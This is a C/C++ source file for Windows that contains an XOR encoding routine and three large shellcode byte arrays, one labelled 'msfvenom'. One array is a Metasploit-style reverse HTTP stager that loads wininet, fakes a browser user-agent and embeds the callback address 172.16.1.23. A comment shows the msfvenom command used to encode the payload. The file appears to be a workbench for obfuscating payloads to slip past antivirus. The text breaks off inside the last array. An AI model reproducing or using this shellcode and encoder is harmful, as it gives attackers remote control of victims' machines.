#include <windows.h>
#include <stdio.h>
#include <tchar.h>

void print_in_hex(unsigned char buffer[]) {
	int buf_len = strlen((const char*)buffer) + 1;
	for (int i = 0; i < buf_len; i++) {
		printf("\\x%x", buffer[i]);

	}
	printf("\n");
	return;
}

unsigned char * do_thing(unsigned char buffer_src[], unsigned char pass[]) {
	int buf_len = strlen((const char *) buffer_src);
	int key_len = strlen((const char *) pass);
	printf("length of pass is %d\n", key_len);
	unsigned char* final = new unsigned char[buf_len + 1];
	unsigned char key_char;
	for (int i = 0; i < buf_len; i++) {
		key_char = pass[i % key_len];
		//printf("doing number %d\n", i);
		//printf("xor char %x with char %x\n", buffer_src[i], key_char);

		//null preserving because i'm lazy and using chars
		if (key_char == buffer_src[i]) {
			final[i] = key_char;
		}
		else {
			unsigned char result = (unsigned char)buffer_src[i] ^ key_char;
			if (result) {
				final[i] = result;
			}
			else {
				final[i] = key_char;
			}

		}
	}
	return final;
}



void _tmain(int argc, TCHAR* argv[])
{
	// ensure no nulls, otherwise will break
	// 192.168.0.34:8080
   unsigned char msfvenom[] =
	   "\xdb\xd7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x91\xba\xe6\x41\xb6"
	   "\x63\x31\x53\x18\x03\x53\x18\x83\xc3\xe2\xa3\x43\x9f\x02\xac"
	   "\xac\x60\xd2\xd3\x9d\xb2\xb6\x98\x8c\x02\xbf\x7a\xbb\x31\xb3"
	   "\x0f\xee\xa1\xfa\xf0\x84\xb8\xd4\x01\x2c\x76\x02\x2f\x92\x2b"
	   "\x76\x2e\x6e\x36\xaa\x90\x4f\xf9\xbf\xd1\x88\x4f\xca\x3e\x44"
	   "\xdb\x66\xd1\xe2\x99\xba\x86\xf5\xcd\x49\x68\x8e\x68\x8d\x1d"
	   "\x22\x72\xdd\x55\xf2\x6c\x8d\xe2\x5b\xad\x2c\x26\xde\x64\x5a"
	   "\xf4\xd0\x89\xeb\x8f\x27\xfd\xea\x59\x76\xc1\x40\xa4\xb6\xcc"
	   "\x99\xe0\x71\x2f\xec\x1a\x82\xd2\xf6\xd8\xf8\x08\x73\xff\x5b"
	   "\xda\x23\xdb\x5a\x0f\xb5\xa8\x51\xe4\xb2\xf7\x75\xfb\x17\x8c"
	   "\x82\x70\x96\x43\x03\xc2\xbc\x47\x4f\x90\xdd\xde\x35\x77\xe2"
	   "\x01\x91\x28\x46\x49\x30\x3e\xf6\xb2\xca\x3f\xab\x24\x5b\xa5"
	   "\x27\xb5\xcb\x52\xae\xdb\x62\xc9\x58\x68\x02\xd7\x9f\x8f\x39"
	   "\x26\x44\x3c\x91\x1a\x29\x90\xfd\xa3\xcd\x16\xfe\x96\xa2\x6c"
	   "\x97\x44\x50\xf0\x48\xa0\x86\xc2\xb6\xe2\x81\x4b\xd9\x96\x42"
	   "\xfb\x56\x77\xd2\x57\xb9\x41\xc4\x66\x82\x8d\x4c\xfb\x9d\xa9"
	   "\x09\x95\x29\x1d\xe6\x47\xe2\x5a\x28\xea\x74\xa7\x19\x3b\x57"
	   "\xe7\x70\x1b\xcb\x6e\xe9\x3e\x33\x36\x88\xa3\x58\xd7\x52\x4c"
	   "\xa5\x71\x2b\x2b\x26\xa8\x98\x60\xb3\x50\x4d\xd4\x2b\xc7\x6e"
	   "\xda\xab\x0f\x8b\xdb\xab\xcf\x84\xac\xcf\x95\x8b\x67\x40\x1e"
	   "\x61\xea\x24\x09\x43\xb2\x93\xc1\xce\x77\xbd\x46\x22\x3e\x7c"
	   "\xcc\x37\xca\x10\xdd\xe5\x79\xdd\x69\x7f\x0f\x64\x47\x46\x81"
	   "\xc3\xfb\xce\x2c\x8d\x33\x5f\xf7\x27\x04\xf2\x3e\xef\x05\x78"
	   "\x34\x5b\xac\xe6\xe9\x30\x5f\x96\x6c\xc7\xaf\x39\xfd\x63\xb5"
	   "\x86\x4a\x39\x44\x78\x7c\xf1\xf6\x36\x15\xb7\xc4\x90\x9b\x61"
	   "\x4f\x49\x0b\xd9\xd7\x2e\xf5\xdc\xd4\xe0\xbb\x51\x70\x34\x53"
	   "\x03\xf3\x02\xdb\x8b\xb4\x3f\x55\x59\x1d\xc7\x24\x8c\xe7\x58"
	   "\xf1\xbf\xdf\xc8\xbe\x4e\x67\x61\x1b\x81\x0a\xfa\xdf\xad\x9b"
	   "\xce\xee\x7d\x4b\x7f\x68\x4b\xa6\x1c\xe0\xd4\x9b\x91\x92\x23"
	   "\x44\x0a\x23\x79\x21\xd3\xe6\xce\xe4\x6f\x60\xa8\xbb\xd0\x25"
	   "\x25\x44\xbe\xa1\xee\xcd\xa1\xf4\xee\x1b\x54\x3e\x43\xcc\x66"
	   "\xbd\x0c\x88\x35\x92\x9f\xc7\xea\x42\x48\x03\x59\x45\xb3\x2c"
	   "\xb4\x0f\xa9\xd8\x69\x63\x7d\x8e\xc6\xd5\xe9\x1d\xee\xc1\x92"
	   "\xa2\x3b\x74\xa4\x28\xd7\x1f\xad\xc0\xd7\xdf\xc5\xa2\x27\xea"
	   "\xf5\xd4\x12\x5a\x83\xcb\x74\x2c\x6b\x0c\x84\xc5\x2b\x64\x84"
	   "\x09\xac\x74\xec\x29\xac\x34\xec\x7a\xc4\xec\x48\x2f\xf1\xf2"
	   "\x45\x43\xaa\x5f\xec\x83\x1a\x08\xee\x6b\xa5\xc8\xbd\x3d\xcd"
	   "\xda\xd7\x4b\xef\x24\x02\xce\x30\xae\x63\x5a\xb7\x4e\xb8\xd8"
	   "\x78\x25\xdb\xbb\xbb\x99\xcb\x43\xc3\xd9\xf4\x8d\x02\x14\x24"
	   "\xdf\x42\x60\x16\x2f\x85\xa3\x52\x4f\x62\x33\x2f\xed\xc2\xde"
	   "\x4f\xa1\x15\xcb";

   unsigned char old_but_stable[] =
   "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x63\x53\x63\x44\x00\xa8\xae\xee\x07\xae\x74\x26\x42\x90\x4a\x31\x64\xc1\xfe\xb6\x3c\x35\x76\x74\x67\x72\x7d\x9e\xe0\xb3\x03\x14\x9d\xcc\xfb\xe4\x23\x48\x7e\x9a\x85\x9c\x88\x2f\x48\x39\xbd\x88\x19\x0b\xd5\x3e\xb4\xed\xc2\xe5\x4f\x52\x70\x83\xd9\xf1\xb6\x34\x85\x90\xfd\xe5\x73\x1e\xc0\x22\x69\x7d\x5c\xb8\x64\x30\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x3a\xca\xdf\x01\xf6\x2d\x04\xd0\x03\x1c\xb2\x72\x7e\x09\xe8\x61\xa9\x68\x1a\xc8\x04\xb1\x60\x3e\x40\x7b\x12\xc7\x54\x8f\x45\x37\x21\x19\xd7\x1f\xd7\x2b\x07\x2b\xf6\x0b\xf7\x66\x09\x45\xda\xcf\x7f\x8c\x71\x6b\xfc\x35\xad\xc8\x7f\x5d\x13\xfa\x0e\x11\xae\x0f\x99\xe8\x89\x59\x91\xe0\xce\x33\x88\x20\xcb\x76\xd3\xd2\xd0\x0d\x3b\xc4\x9e\x92\x2d\x77\xd0\x85\x18\xaa\x3e\xd1\xad\x6f\x61\x93\xa5\x6f\xfd\xdb\x99\xd3\x74\x3a\xd8\xd2\x28\xa9\xc0\xe0\x1d\xdc\x56\x6a\xb9\x23\x86\x00\x66\xd7\x4f\x7c\xdd\xb2\x99\xda\x16\xf9\xfc\xad\x72\xaa\x9c\x6f\x6e\x8b\xb8\x72\xc9\xb9\x79\x13\xdc\x3c\xb7\xd6\x6f\xf8\x5d\x49\x54\x90\xf3\xe1\xdb\x87\xac\x99\x95\xea\x43\x19\x94\x03\xeb\x5a\xbb\xb6\x66\xb9\xb3\x0c\xd4\x68\xec\xbd\x65\x4d\xe1\x03\x6f\xda\x4d\x98\x8e\xf6\x0d\x71\x1a\xfb\xae\xbd\x8f\xc8\xda\xaf\x6e\xe3\x21\xad\x6f\x7c\x1f\xb4\x09\x44\xb5\x3a\x34\x82\xc0\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x37\x32\x2e\x31\x36\x2e\x31\x2e\x32\x33\x00\x21\x62\x59\xd4";

   //cat payload.c | msfvenom  --platform windows  -p - -a x86  -e x86/jmp_call_additive -f c -b "\x00"

   //Final size of c file : 15317 bytes
	   unsigned char plain[] =
   "\xfc\xbb\x15\x3e\xa4\x3a\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
	   "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3a\x14\x84\x56\x21"
	   "\x06\xa3\xd2\xc1\xec\x0b\x23\x28\x21\x6c\x31\x33\x35\x09\xc6"
	   "\xe3\x9f\xfe\x22\x96\xb1\x73\x5a\x3f\x20\x11\xf8\x9f\xdf\xb1"
	   "\x61\xad\x3f\x20\x17\x37\x1b\xf9\xf7\x8a\xbb\x23\xa4\x8c\xdd"
	   "\x40\x08\x14\x16\xbf\xec\x9c\x6e\x8c\x50\x24\xea\xc6\x34\xac"
	   "\x92\x16\x99\x34\x3e\x6f\x7d\xbc\xa3\xb7\x21\x44\x14\xf8\x85"
	   "\xcc\x64\xc8\x69\x54\xb5\x18\xce\xdc\x81\x69\xb2\x64\xdf\xb8"
	   "\x16\xec\x2b\x8a\xfa\x74\x61\xdc\x5e\xfc\xbc\x2e\x03\x84\x8b"
	   "\x7f\xe7\x0c\xc1\x49\x4b\x94\x1d\x8e\x2f\x1c\x6d\xdf\x93\xa4"
	   "\xf5\x2d\x70\x2c\xc0\x64\xd4\xb4\x18\xbf\xb8\x3c\x59\xdd\x1c"
	   "\xc4\xac\x13\xc1\x4c\xf9\x63\xa5\xd4\x31\xbc\x09\x5c\x02\xde"
	   "\xed\xe4\x47\x2c\x52\x6c\x99\x68\x36\xf4\xed\xb0\x9a\x7c\x36"
	   "\xa3\x7e\x04\x73\x11\x23\x8c\x49\x65\x87\x14\x9a\xbd\x6b\x9c"
	   "\xda\xdf\xcf\x24\x2c\x12\xac\xac\x67\x62\x10\x34\xbc\xba\xf4"
	   "\xbc\x8c\xdc\x58\x44\x8f\x17\x3d\xcc\x7b\x39\xe1\x54\xb0\xd8"
	   "\x45\xdc\x8c\x7e\x2a\x64\xde\x4f\x8e\xec\x43\x89\x72\x74\xb0"
	   "\xd1\xd6\xfc\x8b\x10\xbb\x84\x88\x62\x1f\x0c\x2e\xe0\xc3\x94"
	   "\x83\x85\xa7\x1c\xd2\x78\x04\xa4\x2d\x18\xe8\x2c\x62\xec\x4c"
	   "\xb4\xb0\x73\x31\x3c\x87\x43\x95\xc4\xd3\x92\x79\x4c\x7f\xe4"
	   "\xdd\xd4\x1c\x3f\x82\x5c\xd3\x5b\x66\xe4\x27\x95\xca\x6c\x78"
	   "\xe4\xae\xf4\x1b\x37\x13\x7c\xb9\x05\xf7\x04\x24\x0e\x5b\x8c"
	   "\x93\xfc\x3f\x14\xe8\x31\x9c\x9c\x25\x03\x40\x24\x72\x5b\x24"
	   "\xac\x42\xf9\x88\x34\x86\xcf\x6c\xbc\xda\x1f\xd1\x44\x23\x02"
	   "\xb5\xcc\x67\xf0\x19\x54\xbb\x97\xfd\xdc\x8f\x6f\xa2\x64\xc0"
	   "\xbe\x06\xec\x44\xf1\xea\x74\xb3\xc7\x4e\xfc\x83\x16\x33\x84"
	   "\xc4\x60\x97\x0c\x1a\xa9\x7b\x94\x6c\xab\xdf\x1c\xbd\x19\xbc"
	   "\xa4\x8a\x68\x60\x2c\xc2\xa0\xc4\xb4\x14\xa7\xa8\x3c\x5d\x17"
	   "\x0d\xc4\xa5\x6f\xf1\x4c\xe6\xbf\x55\xd4\x36\xf0\x39\x5c\x07"
	   "\xc0\x9d\xe4\x53\x18\x42\x6c\xa4\x6d\x26\xf4\xb7\xbd\x8a\x7c"
	   "\x0f\x8a\x6e\x04\x59\xc5\xd2\x8c\x91\x11\xb7\x14\xea\x50\x1b"
	   "\x9c\x6e\xa3\xff\x24\x5a\xf3\xa3\xac\x9c\x91\x07\x34\xe9\x6d"
	   "\xe4\xbc\x20\xb6\x48\x44\x77\xf2\x2c\xcc\x4f\x98\x90\x54\x84"
	   "\x6c\x75\xdc\xd6\xbc\xd9\x64\x23\x84\xbd\xec\x7b\xc7\x61\x74"
	   "\x18\x17\xc6\xfc\x85\x64\xaa\x84\x70\xbd\x0e\x0c\x4f\xf9\xf2"
	   "\x94\xc9\x9f\x56\x1c\x75\x59\x3b\xa4\x4d\xa8\x9f\x2c\x96\xa8"
	   "\x43\xb4\xd5\x18\x20\x3c\x22\x59\x84\xc4\x66\xa1\x68\x4c\xb7"
	   "\xe0\xcc\xd4\xd3\x34\xb1\x5c\x28\x5d\x15\xe4\x63\xac\xf9\x6c"
	   "\xe7\xf7\x5d\xf4\xd3\x3f\x02\x7c\x2f\x71\xe6\x04\x2c\x41\x4a"
	   "\x8c\xd3\xc2\x2e\x14\x20\x34\x93\x9c\x2b\x07\x77\x24\xcf\x5e"
	   "\xdb\xac\x3f\xc5\xbf\x34\x74\x34\x1c\xbc\x44\x07\xc0\x44\xc6"
	   "\x56\xa4\xcc\x3b\xa1\x08\x54\x59\xe1\xec\xdc\x96\x34\x51\x64"
	   "\xbf\x07\x35\xec\x0b\x0b\x99\x74\x44\xf8\x7d\xfc\x90\x9d\x21"
	   "\x84\xea\x55\x86\x0c\x3b\xae\x6a\x94\x0f\xfb\xce\x1c\x43\x3a"
	   "\xb3\xa4\xc7\x0d\x17\x2c\x3f\x5b\xfb\xb4\x5b\x9b\x5f\x3c\x91"
	   "\xe3\x03\xc4\xed\x27\xe0\x4c\x36\x2a\x44\xd4\x72\x9a\x28\x5c"
	   "\x49\xee\x8c\xe4\x99\x37\x71\x6c\xd2\x76\xd5\xf4\x76\x49\xb9"
	   "\x7c\x41\x9f\x1d\x04\x99\xee\xc1\x8c\xd9\x72\xa6\x14\x2a\x10"
	   "\x0a\x9c\x7e\xee\xee\x24\x4b\x3a\x53\xac\x8b\x20\x37\x34\xd8"
	   "\x94\x9b\xbc\x11\xb6\x7f\x44\x66\x01\xdc\xcc\xb6\x40\x80\x54"
	   "\xd3\x92\x64\xdc\x2f\xe2\xc8\x64\x68\x66\xad\xec\xb8\x52\x11"
	   "\x74\x81\xa2\xf5\xfc\xc5\xea\x59\x84\x15\x3a\x3e\x0c\x32\x0c"
	   "\xe2\x94\x8e\x5d\x46\x1c\xda\xa5\x2a\xa4\x10\xe7\x8e\x2c\x6c"
	   "\x3f\x73\xb4\xbb\x5a\xd7\x3c\xf1\x9d\xbb\xc4\xcc\xbc\x1f\x4c"
	   "\x1b\x0e\xfc\xd4\x56\x48\xa0\x5c\xad\x99\x04\xe4\xf8\xe0\xe8"
	   "\x6c\x37\x22\x4d\xf4\x02\x25\x31\x7c\x59\x9d\x95\x04\x99\xee"
	   "\x79\x8c\xbc\x73\xde\x14\x0d\x44\x82\x9c\x45\x95\x66\x24\x93"
	   "\xe7\xca\xac\xbd\x61\xaf\x34\x27\x5e\x13\xbc\x92\xa6\xf7\x44"
	   "\xe9\xe7\x5b\xcc\x24\x31\x38\x54\x72\x20\x9c\xdc\x48\x9a\x40"
	   "\x64\x89\xb8\x24\xec\xd8\x0e\x89\x74\x7e\x56\x6d\xfc\xb4\xce"
	   "\xd1\x84\xd2\x68\xb6\x0c\x7d\x13\x1a\x94\xe7\xbd\xfe\x1c\xdd"
	   "\x25\xa3\xa4\x2b\xc7\x07\x2c\x64\x37\xe4\xb4\xb0\x0e\x48\x3c"
	   "\xdb\x15\x2c\xc4\x2c\xe1\x90\x4c\x65\x34\x75\xd4\xbf\x23\xd9"
	   "\x5c\xf6\x92\xbd\xe4\xc0\x81\x61\x6c\x1b\x7f\xc6\xf4\x54\x4b"
	   "\xaa\x7c\xab\x83\x0e\x04\xff\xd2\xf2\x8c\xca\x22\x57\x14\x01"
	   "\x72\x3b\x9c\x51\xbd\x9f\x24\xc7\x8b\x43\xac\x33\x97\x27\x34"
	   "\x04\x6e\x84\xbc\x12\xa1\x68\x44\xef\xf0\xcc\xcc\x6d\x92\xb0"
	   "\x54\x46\x37\x15\xdc\x91\x80\xf9\x64\xec\xd8\x5d\xec\x20\x12"
	   "\x02\x74\x27\x3a\xe6\xfc\xc3\xf7\x4a\x84\x3f\xc0\x2e\x0c\x73"
	   "\x01\x93\x94\x10\x58\x77\x1c\xe3\xa2\xdb\xa4\x38\xe2\xbf\x2c"
	   "\x5b\x36\x1c\xb4\x97\x52\xc0\x3c\xeb\xab\xa4\xc4\x68\xfc\x08"
	   "\x4c\x5b\x98\xec\xd4\x90\x51\x51\x5c\xb4\xa8\x35\xe4\x0e\xfa"
	   "\x99\x6c\x5a\xcc\x7d\xf4\x90\x1d\x22\x7c\xec\x6d\x86\x04\x3a"
	   "\xbf\x6a\x8c\x20\xde\xce\x14\x96\x41\xb3\x9c\xed\xb7\x17\x24"
	   "\x39\x81\xfb\xac\x24\xc6\x5f\x34\xc1\x4e\x3c\xbc\x69\xba\xe0"
	   "\x44\x17\xa6\x44\xcc\xe0\x15\x29\x54\x3a\x3b\x8d\xdc\x70\x83"
	   "\x71\x64\x41\xca\xd5\xec\xd2\x1d\xba\x74\x21\x6f\x1e\xfc\x2b"
	   "\xb7\xc2\x84\x9e\xf7\xa6\x0c\xd1\xc7\x0a\x94\x21\x18\xef\x1c"
	   "\x72\x68\x53\xa4\x46\xec\x37\x2c\x94\xdd\x9b\xb4\xb9\x24\x78"
	   "\x3c\x0a\x66\xdc\xc4\x47\xb9\x80\x4c\x9c\x88\x64\xd4\xe9\xdb"
	   "\xc8\x5c\x24\x7d\xad\xe4\x78\x4e\x11\x6c\x4d\x81\xf5\xf4\x98"
	   "\xd0\x59\x7c\xd7\x23\x3e\x04\x75\x25\xe2\x8c\x4c\x92\x46\x14"
	   "\x97\xe5\x2a\x9c\xde\x73\x8f\x24\x42\x4a\x73\xac\xe2\xd4\xd7"
	   "\x34\x8f\x2d\xb4\xbc\x2a\x2c\x18\x44\x80\x89\xfc\xcc\xdf\x8b"
	   "\xa0\x54\x14\x74\x05\xdc\x6c\xbd\xe9\x64\xee\x8c\x4d\xec\xc4"
	   "\xd6\x31\x74\x16\x16\x96\xfc\x3c\x6a\x7a\x84\x88\xb3\xde\x0c"
	   "\xc9\xfa\x82\x94\x4d\xc5\x66\x1c\xba\x51\xcb\xa4\xf1\xa8\xaf"
	   "\x2c\x95\xf3\x13\xb4\x6c\x36\xf0\x3c\xb9\x0e\x54\xc4\xf5\x5e"
	   "\x38\x4c\xc6\xac\x9c\xd4\x12\xe1\x40\x5c\x63\x35\x25\xe4\xa6"
	   "\x07\x89\x6c\xfc\x55\x6d\xf4\xca\xa8\xd1\x7c\x51\xaa\xb5\x04"
	   "\xf0\x4e\x1a\x8c\xcf\xbb\xfe\x14\x02\xa1\xa2\x9c\x51\x4b\x07"
	   "\x24\xf0\xed\xeb\xac\x98\xc4\x4f\x34\x55\x1f\x2c\xbc\xad\x66"
	   "\x90\x44\xad\xae\x74\xcc\x05\xf7\xd8\x54\x5e\x34\xbd\xdc\xfd"
	   "\x09\x61\x64\x37\x5e\xc5\xec\x01\xff\xa9\x74\x5e\x9e\x0d\xfc"
	   "\xab\x06\xf2\x84\xe7\xfe\x56\x0c\x30\xc6\x3a\x94\x26\x09\x9f"
	   "\x1c\x93\x51\x43\xa4\xe3\x98\x27\x2c\x70\xba\x8b\xb4\x4c\x05"
	   "\x68\x3c\xce\x42\xcc\xc4\x73\x9d\xb0\x4c\x12\xbb\x14\xd4\xbc"
	   "\x25\xf9\x5c\x27\xcc\x5d\xe4\xc1\x76\x02\x6c\x3a\x13\xe6\xf4"
	   "\x71\xea\x4a\x7c\x15\x35\x2f\x04\xec\x77\x93\x8c\x3b\x4a\x77"
	   "\x14\x70\x9b\xdb\x9c\x1a\xba\xbf\x24\xe9\x58\x1c\xac\x3d\x97"
	   "\xc0\x34\x0f\xef\xa4\xbc\x58\x6d\x09\x44\xc1\x17\xed\xcc\x69"
	   "\xed\x51\x54\x4a\x38\x36\xdc\xc9\x72\x9a\x64\x3e\x15\x7e\xec"
	   "\x06\xec\x22\x74\x4e\x6a\x87\xfc\x80\x43\x6b\x84\xd0\x93\xcf"
	   "\x0c\x21\xe4\xb3\x94\x75\x3c\x10\x1c\x10\x5a\xf4\xa4\xbf\xc4"
	   "\x58\x2c\x70\x6f\x3d\xb4\x48\x5b\xe1\x3c\x91\xc0\x45\xc4\xd1"
	   "\x37\x2a\x4c\x22\x08\x8e\xd4\x72\x58\x72\x5c\x16\xfa\xd6\xe4"
	   "\xbc\xc9\xba\x6c\x58\x17\x1f\xf4\xc7\x53\xc3\x7c\x38\xad\xa7"
	   "\x04\x08\xfd\x0b\x8c\x58\xcd\xef\x14\xfc\x15\x4c\x9c\x9f\x57"
	   "\x30\x24\x06\xfe\x94\xac\xa0\x98\x78\x34\x4b\x03\xdd\xbc\xa1"
	   "\xad\x81\x44\xf0\x02\x66\xcc\xc9\x57\xca\x54\x04\xab\xae\xdc"
	   "\x5c\xff\x12\x64\xad\xcf\xf6\xec\xac\x17\x5b\x74\x4e\x0d\x3f"
	   "\xfc\xf5\xa8\xe3\x84\xc5\x05\x40\x0c\x47\x0f\x24\x94\xb0\xfb"
	   "\x88\x1c\x8d\x35\x6d\xa4\xc5\x0b\xd1\x2c\x1f\x5c\xb5\xb4\x6b"
	   "\xfd\x19\x3c\xa7\xcc\xfd\xc4\xf1\x1a\xa2\x4c\x9d\x53\x06\xd4"
	   "\x07\xf1\xea\x5c\xaa\xcf\x4e\xe4\x19\x53\x33\x6c\x6d\xa6\x97"
	   "\xf4\xa6\xfe\x7b\x7c\xfe\xca\xdf\x04\x36\x04\xbc\x8c\x01\x58"
	   "\x60\x14\x59\xf8\xc4\x9c\x9c\x65\xa9\x24\xba\x55\x0d\xac\x26"
	   "\xa5\xf1\x34\x97\xfa\x55\xbc\xe6\xc8\x39\x44\x30\x55\x9e\xcc"
	   "\x21\xf6\x42\x54\xc0\x9a\x26\xdc\x69\x6f\x8b\x64\x40\xbc\x6f"
	   "\xec\x90\xfa\xd3\x74\xee\x9f\xb7\xfc\x29\x01\x14\x84\x71\xf4"
	   "\xf8\x0c\xbb\x95\x5c\x94\x83\x61\x01\x1c\xc6\xf7\xe5\xa4\x12"
	   "\xc0\x49\x2c\x68\x09\x2e\xb4\xec\x0d\x92\x3c\xc9\xf5\x76\xc4"
	   "\x18\x3f\xdb\x4c\x6b\x5d\xbf\xd4\xef\x94\x63\x5c\xc3\xb3\xc7"
	   "\xe4\x41\x08\xa4\x6c\xe3\x14\x08\xf4\x88\xe6\xec\x7c\x2a\x32"
	   "\x51\x04\x80\x5a\x35\x8c\xdd\x90\x99\x14\x29\xe5\x7d\x9c\x6d"
	   "\x36\x22\x24\xea\x01\x86\xac\x94\x40\x6a\x34\x3b\x95\xce\xbc"
	   "\x88\xed\xb2\x44\xd7\x38\x17\xcc\x1e\x73\xfb\x54\x07\x17\x5f"
	   "\xdc\xa2\xe2\x03\x64\x1a\x3e\xe0\xec\x55\x25\x44\x74\xf5\x95"
	   "\x28\xfc\xcb\xe7\x8c\x84\x1d\x31\x71\x0c\x55\x25\xd5\x94\xac"
	   "\xc6\xb9\x1c\xad\x30\x1e\xa4\x07\x75\xc2\x2c\x5b\x45\xa6\xb4"
	   "\xab\x95\x0a\x3c\xf9\xe0\xee\xc4\x36\x38\x53\x4c\x0f\x0b\x37"
	   "\xd4\x58\x41\x9b\x5c\x95\xc1\x7f\xe4\xed\x38\xdc\x6c\x38\x0c"
	   "\x80\xf4\x72\x47\x64\x7c\x4d\xc2\xc8\x04\x86\x38\xad\x8c\xdb"
	   "\x21\x11\x14\x2e\x92\xf5\x9c\x7a\xb6\x59\x24\xb5\x50\x3e\xac"
	   "\x8e\xfd\xe2\x34\xc7\xc4\x46\xbc\x11\x54\x2b\x44\x68\xf9\x8f"
	   "\xcc\xa2\xcc\x73\x54\xf9\x48\xd0\xdc\xce\xa1\xb4\x64\x03\xaf"
	   "\x18\xec\x50\x1f\xfd\x74\xa5\x6f\xa1\xfc\xfb\xb7\x05\x84\xcd"
	   "\xf4\xe9\x0c\x04\x9d\x4d\x94\x5e\x05\x32\x1c\xa8\xf5\x96\xa4"
	   "\xe0\xc4\x7a\x2c\x3a\x13\xdf\xb4\x72\x62\x83\x3c\x4d\xa6\x67"
	   "\xc4\x87\xa5\xcb\x4c\xde\x1c\xa8\xd4\x2d\x3d\x0c\x5c\x60\xf1"
	   "\xf0\xe4\xb0\x95\x54\x6c\x8c\x66\x39\xf4\xda\xb1\x9d\x7c\x17"
	   "\xf7\x41\x04\x65\xc7\x25\x8c\xba\x16\x8a\x14\x8e\x68\x6e\x9c"
	   "\xc2\xed\xd2\x24\x10\xde\xb6\xac\x65\x7c\x1b\x34\xb8\xb0\xff"
	   "\xbc\x89\x87\xa3\x44\xc4\xde\x07\xcc\x1e\x44\xe4\x54\x69\xb2"
	   "\x48\xdc\xa3\xdc\x2c\x64\xfb\x17\x91\xec\x34\x6b\x75\x74\x09"
	   "\xbb\xd9\xfc\x59\xde\xbd\x84\x94\x14\x62\x0c\xe5\x64\xc6\x94"
	   "\x3a\xb3\xaa\x1c\x0f\xde\x0e\xa4\x5c\x11\xf3\x2c\x90\x33\x57"
	   "\xb4\xe4\x83\x3b\x3c\x3c\xd3\x9f\xc4\x0a\x7d\x7c\x4c\x46\xb6"
	   "\x20\xd4\x9b\x8e\x84\x5c\xef\xda\x68\xe4\x3c\x41\xcd\x6c\x71"
	   "\xb5\xb1\xf4\x40\x81\x15\x7c\x9c\xdb\xf9\x04\xd4\x22\x5e\x8c"
	   "\x2e\x61\x02\x14\x79\xbc\xe6\x9c\xb3\xdb\x4a\x24\x8b\x17\x2f"
	   "\xac\xc1\x31\x93\x34\x15\x88\x77\xbc\x6b\x91\xdb\x44\xbf\x69"
	   "\xb8\xcc\x8c\xeb\x1c\x54\xc1\xdb\xc0\xdc\x11\x78\xa5\x64\x6e"
	   "\xb1\x09\xec\xbb\x82\xed\x74\xf1\xd4\x51\xfc\xcb\x2d\x36\x84"
